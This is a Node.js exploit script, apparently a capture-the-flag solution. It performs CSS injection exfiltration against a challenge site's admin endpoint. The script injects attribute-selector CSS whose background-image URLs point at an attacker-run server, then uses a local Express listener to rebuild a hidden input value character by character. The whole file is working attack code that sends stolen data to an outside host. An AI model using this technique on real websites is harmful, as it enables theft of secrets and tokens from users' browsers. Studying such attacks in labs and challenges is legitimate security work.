const axios = require('axios');
const express = require("express");
const app = express();
const cssesc = require('cssesc');
var argv = require('minimist')(process.argv.slice(2));

console.log('Usage: -b [base_url with no trailing \\] -p [local server port] -u [local server url with no trailing \\]');

const baseUrl = argv.b;
const port = parseInt(argv.p);
const serverUrl = argv.u;

let currentValue = "";
let possibleChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#?$%.\'"+:->';

function encodeURIAll(input) {
    let out = encodeURIComponent(input);
    out = out.replace(/\!/g, '%21');
    out = out.replace(/\./g, '%2E');
    out = out.replace(/\'/g, '%27');
    out = out.replace(/\-/g, '%2D');
    return out;
}

async function sendAdmin(payload) {
    console.log("Sending to admin...");
    try {
        const response = await axios({
            method: 'post',
            url: baseUrl + '/admin',
            data: `url=http%3A%2F%2Fchall.csivit.com%3A30256%2Fview&color=${payload}`,
            proxy: {
                host: "127.0.0.1",
                port: 8080
            }
        });
        return response;
    } catch (err) {
        console.error(err);
    }
}

function generateMessage(prefix) {
    message = "blue;}";
    possibleChars.split('').forEach(char => {
        let urlPrefix = encodeURIAll(prefix + char);
        let cssPrefix = cssesc(prefix + char, {
            'isIdentifier': true
          });
        message += "input[value^=" + cssPrefix + ']~*{ background-image:url("'+ serverUrl + '/exfil/' + urlPrefix + '");}\n';
    });
    message += '.throwaway{';
    return message;
}

async function doStuffAsync() {
    const msg = generateMessage(currentValue);
    sendAdmin(encodeURIComponent(msg));
}

app.get("/exfil/:value", async (req, res) => {
    console.log('--Got response from admin browser for ' + req.params.value);
    if (currentValue !== req.params.value) {
        currentValue = req.params.value;
        const msg = generateMessage(currentValue);
        sendAdmin(encodeURIComponent(msg));
        res.sendStatus(200);
    } else {
        console.log('VALUE IS ' + currentValue);
        process.exit(0);
    }
});

app.listen(port, () => console.log(`listening on port ${port}`));

doStuffAsync()